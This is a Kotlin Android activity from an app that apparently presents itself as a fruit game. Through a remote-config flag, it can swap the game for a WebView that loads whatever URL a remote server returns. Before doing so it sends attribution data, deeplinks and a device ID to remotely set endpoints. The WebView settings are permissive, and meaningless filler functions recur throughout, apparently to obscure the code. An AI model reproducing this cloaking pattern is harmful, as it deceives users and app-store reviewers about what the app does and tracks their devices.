package com.tale.fruittale.fruit.modile.app

import android.graphics.Bitmap
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.webkit.*
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.tale.fruittale.fruit.modile.app.databinding.ActivityMainBinding
import com.tale.fruittale.fruit.modile.app.init.keys
import com.tale.fruittale.fruit.modile.app.main.fragmentsMainGames
import org.json.JSONObject
import java.util.*


lateinit var bindMain: ActivityMainBinding
var fly: String? = null
lateinit var dataPhone: Map<String, Any>
lateinit var cohfigs: FirebaseRemoteConfig




class MainActivity : AppCompatActivity() {

    var dp: String? = null
    var urls1: String? = null
    var uri2: String? = null
    var configweb: Boolean = false



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMain.root)
        val getfly = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        fly = getfly
        val AnimationView = AnimationUtils.loadAnimation(this, R.anim.loadfb)
        bindMain.loading.startAnimation(AnimationView)
        AnimationView.setAnimationListener(object : Animation.AnimationListener{
            override fun onAnimationStart(starts: Animation?) {
            }

            override fun onAnimationEnd(starts: Animation?) {
                firebaseInitSGK()
                news()
                posting1()
                posting2()
                posting3()
            }

            override fun onAnimationRepeat(starts: Animation?) {
            }
        })


            bindMain.container.visibility = View.GONE
            supportFragmentManager
                .beginTransaction()
                .replace( R.id.container, fragmentsMainGames())
                .commit()


    }

    private fun errorVolley() {
        news()
        posting1()
        posting2()
        posting3()
        val errorsVolley1 = Volley.newRequestQueue(this)
        val errorInfo = JSONObject()
        errorInfo.put("name", "a_o_e")
        val errorInfo2 = JSONObject()
        errorInfo2.put("success", true)
        errorInfo.put("data", errorInfo2)
        errorInfo.put("created", countryTime())
        var eventGetError = uri2

        val postResponse = object: JsonObjectRequest(
            Request.Method.POST, eventGetError, errorInfo,
            { response ->

            }, { error ->

            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val errorHead: MutableMap<String, String> = HashMap()
                errorHead["Device-UUID"] = fly!!
                return errorHead
            }
        }
        errorsVolley1.add(postResponse)
        news()
        posting1()
        posting2()
        posting3()
    }

    private fun firebaseInitSGK() {
        cohfigs = FirebaseRemoteConfig.getInstance()
        val getBase = FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(3600).build()
        cohfigs.setConfigSettingsAsync(getBase)
        cohfigs.setDefaultsAsync(R.xml.remote_config_defaults)
        cohfigs.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    val webInfo: Boolean = cohfigs.getBoolean("web")
                    if (webInfo == true) {
                        urls1 = cohfigs.getString("mainurl1")
                        uri2 = cohfigs.getString("mainurl2")

                        OpenWebEvents(fly!!)
                        fbSDK()
                        FlyersSDK()
                        news()
                        posting1()
                        posting2()
                        posting3()

                    } else {
                        bindMain.container.visibility = View.VISIBLE
                        bindMain.webview.visibility = View.GONE
                        bindMain.lot.visibility = View.GONE
                        news()
                        posting1()
                        posting2()
                        posting3()
                        bindMain.loading.visibility = View.GONE
                    }

                } else {
                    Toast.makeText(this, "Retry Connected", Toast.LENGTH_SHORT).show()

                }

            }
    }

    private fun FlyersSDK() {
        AppsFlyerLib.getInstance().setDebugLog(true)
        news()
        posting1()
        posting2()
        posting3()
        val peopleInfo: AppsFlyerConversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(DataOrganic: Map<String, Any>) {
                try {
                    dataPhone = DataOrganic
                    checkOpensWebViews()
                    errorVolley()
                    news()
                    posting1()
                    posting2()
                    posting3()

                } catch (errors: Exception) {
                    errors.printStackTrace()
                }
            }

            override fun onConversionDataFail(erSub: String) {
                runOnUiThread {
                    bindMain.webview.visibility = View.GONE
                    bindMain.container.visibility = View.VISIBLE
                    bindMain.lot.visibility = View.GONE
                    news()
                    posting1()
                    posting2()
                    posting3()
                    bindMain.loading.visibility = View.GONE
                }
            }

            override fun onAppOpenAttribution(erSubData: Map<String, String>) {
                runOnUiThread {
                    bindMain.webview.visibility = View.GONE
                    bindMain.container.visibility = View.VISIBLE
                    bindMain.lot.visibility = View.GONE
                    news()
                    posting1()
                    posting2()
                    posting3()
                    bindMain.loading.visibility = View.GONE
                }
            }

            override fun onAttributionFailure(erSubAtrib: String) {
                runOnUiThread {
                    bindMain.webview.visibility = View.GONE
                    bindMain.container.visibility = View.VISIBLE
                    bindMain.lot.visibility = View.GONE
                    news()
                    posting1()
                    posting2()
                    posting3()
                    bindMain.loading.visibility = View.GONE
                }
            }
        }
        AppsFlyerLib.getInstance().init(keys.flyer, peopleInfo, this)
        AppsFlyerLib.getInstance().registerConversionListener(this, peopleInfo)
        AppsFlyerLib.getInstance().start(this)
    }

    private fun checkOpensWebViews() {
        news()
        posting1()
        posting2()
        posting3()
        val mainWindows = Volley.newRequestQueue(this)
        val jsMain = JSONObject()
        jsMain.put("appsFlyerId", fly)
        val MainView = JSONObject(dataPhone)
        jsMain.put("apsInfo", MainView)
        jsMain.put("deeplink", if(dp == null) JSONObject.NULL else dp)
        var LinkedUrlMain = urls1
        val jsMains = object: JsonObjectRequest(
            Request.Method.POST, LinkedUrlMain, jsMain,
            { response ->
                if(response.getBoolean("success")) {

                    configweb = true
                    bindMain.webview.settings.javaScriptEnabled = true
                    bindMain.webview.settings.domStorageEnabled = true
                    bindMain.webview.settings.useWideViewPort = true
                    bindMain.webview.settings.loadWithOverviewMode = true
                    bindMain.webview.settings.allowFileAccess = true
                    bindMain.webview.settings.javaScriptCanOpenWindowsAutomatically = true
                    bindMain.webview.settings.setSupportMultipleWindows(false)
                    bindMain.webview.settings.displayZoomControls = false
                    bindMain.webview.settings.builtInZoomControls = true
                    bindMain.webview.settings.setSupportZoom(true)
                    bindMain.webview.settings.pluginState = WebSettings.PluginState.ON
                    bindMain.webview.settings.mixedContentMode = 0
                    bindMain.webview.settings.allowContentAccess = true
                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().setAcceptThirdPartyCookies(bindMain.webview, true)

                    bindMain.webview.webViewClient = object : WebViewClient() {
                        override fun onPageStarted(dsfghf: WebView?, str: String?, map: Bitmap?) {
                            super.onPageStarted(dsfghf, str, map)
                            news()
                            posting1()
                            posting2()
                            posting3()
                        }

                        override fun onPageFinished(v: WebView, links: String) {
                            bindMain.webview.visibility = View.VISIBLE
                            bindMain.container.visibility = View.GONE
                            bindMain.lot.visibility = View.GONE

                            bindMain.loading.visibility = View.GONE
                            installInfo(links)
                            news()
                            posting1()
                            posting2()
                            posting3()
                        }

                        override fun onReceivedHttpError(
                            webStr: WebView?,
                            zapros: WebResourceRequest?,
                            reqsaint: WebResourceResponse?
                        ) {
                            super.onReceivedHttpError(webStr, zapros, reqsaint)
                            ErorrsMains( reqsaint!!.statusCode.toString())
                            news()
                            posting1()
                            posting2()
                            posting3()
                        }

                        @RequiresApi(Build.VERSION_CODES.M)
                        override fun onReceivedError(weidbew: WebView?, setmains: WebResourceRequest?, info: WebResourceError?) {
                            super.onReceivedError(weidbew, setmains, info)
                            ErorrsMains( info.toString())
                        }
                    }
                    bindMain.webview.loadUrl(response.getString("url"))
                    news()
                    posting1()
                    posting2()
                    posting3()
                }
                else{
                    bindMain.webview.visibility = View.GONE
                    bindMain.container.visibility = View.VISIBLE
                    bindMain.lot.visibility = View.GONE
                    bindMain.loading.visibility = View.GONE
                    news()
                    posting1()
                    posting2()
                    posting3()
                }
            }, { error ->
                bindMain.webview.visibility = View.GONE
                bindMain.lot.visibility = View.GONE

                bindMain.container.visibility = View.VISIBLE
                bindMain.loading.visibility = View.GONE
                news()
                posting1()
                posting2()
                posting3()
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val responseInfo: MutableMap<String, String> = HashMap()
                responseInfo["Device-UUID"] = fly!!
                return responseInfo
            }
        }
        mainWindows.add(jsMains)
    }
    private fun news() {

        var str: String = "skfjkdjkfksladasd"
        var str1: String = "skfjkdjkfksladasd"
        var num = str.length + str1.length
        println(num)

    }
    private fun posting1() {
        var p = "sjkfdlmlakdsdadfdsd".length
        var p1= 10
        if (p >= 10){

            var con = p * p1
            println(con)
            var p2 = con + 10
            println(p2)
        }
        else {

            println("Check")

        }
    }
    private fun posting2() {
        var p = "sjkfdlmlakdsdadfdsd".length
        var p1= 10
        if (p >= 10){

            var con = p * p1
            println(con)
            var p2 = con + 10
            println(p2)
        }
        else {

            println("Check")

        }
    }
    private fun posting3() {
        var text = "lsfisaskdjbsgkfdjhgfmad"
        var p = text.length
        var p1= "shjfdkjhahdjfkmdsfdads".length
        if (p >= 10){

            var con = p * p1
            println(con)
            var p2 = con + 10
            println(p2)
            var p4 = p1 + p
            println(p4)
        }
        else {

            println("Check")

        }
    }
    private fun installInfo( url: String) {
        news()
        posting1()
        posting2()
        posting3()
        val VolleyInfo = Volley.newRequestQueue(this)
        val InfoGets = JSONObject()
        InfoGets.put("name", "a_p_f")
        val bodyMains = JSONObject()
        bodyMains.put("success", true)
        bodyMains.put("url", url)
        InfoGets.put("data", bodyMains)
        InfoGets.put("created", countryTime())
        var postLink = uri2

        val urlstoo = object: JsonObjectRequest(
            Request.Method.POST, postLink, InfoGets,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val mains: MutableMap<String, String> = java.util.HashMap()
                mains["Device-UUID"] = fly!!
                return mains
            }
        }
        VolleyInfo.add(urlstoo)
    }

    private fun countryTime(): Long {
        val times: Date = Calendar.getInstance().time
        return times.time
    }

    private fun ErorrsMains(s: String) {
        news()
        posting1()
        posting2()
        posting3()
        val errorsW = Volley.newRequestQueue(this)
        val jsErrors = JSONObject()
        jsErrors.put("name", "a_e_w")
        val ErrorsMains = JSONObject()
        ErrorsMains.put("success", true)
        ErrorsMains.put("url", urls1)
        ErrorsMains.put("error", s)

        jsErrors.put("data", ErrorsMains)
        jsErrors.put("created", countryTime())
        var Uri321 = uri2

        val responseAEW = object: JsonObjectRequest(
            Request.Method.POST, Uri321, jsErrors,
            { response ->

            }, { error ->

            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val MutHeads: MutableMap<String, String> = java.util.HashMap()
                MutHeads["Device-UUID"] = fly!!
                return MutHeads
            }
        }
        errorsW.add(responseAEW)
    }

    private fun fbSDK() {
        news()
        posting1()
        posting2()
        posting3()
        FacebookSdk.sdkInitialize(applicationContext)
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.setApplicationId(cohfigs.getString("fb"))
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            if(it==null){
                dp = it.toString()
            } else {
                dp = it.getTargetUri().toString()
            }
        }
    }

    private fun OpenWebEvents(str: String) {
        news()
        posting1()
        posting2()
        posting3()
        val WebOpen = Volley.newRequestQueue(this)
        val WebTelo = JSONObject()
        WebTelo.put("name", "a_o")
        val WebTelo2 = JSONObject()
        WebTelo2.put("success", true)
        WebTelo.put("data", WebTelo2)
        WebTelo.put("created", countryTime())
        var urls = uri2
        val requestJSBody = object: JsonObjectRequest(
            Request.Method.POST, urls, WebTelo,
            { response ->

            }, { error ->

            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val Head: MutableMap<String, String> = HashMap()
                Head["Device-UUID"] = str
                Log.d("IDDEVICE", "$str")
                return Head
            }
        }
        WebOpen.add(requestJSBody)
    }


    override fun onKeyDown(k: Int, e: KeyEvent?): Boolean {
        if ((k == KeyEvent.KEYCODE_BACK) && bindMain.webview.canGoBack()) {
            bindMain.webview.goBack()
            return true
        }

        return super.onKeyDown(k, e)
    }
    override fun onBackPressed() {
        if ( bindMain.webview.isFocused() &&  bindMain.webview.canGoBack()) {
            bindMain.webview.goBack()
        } else {
        }
    }
}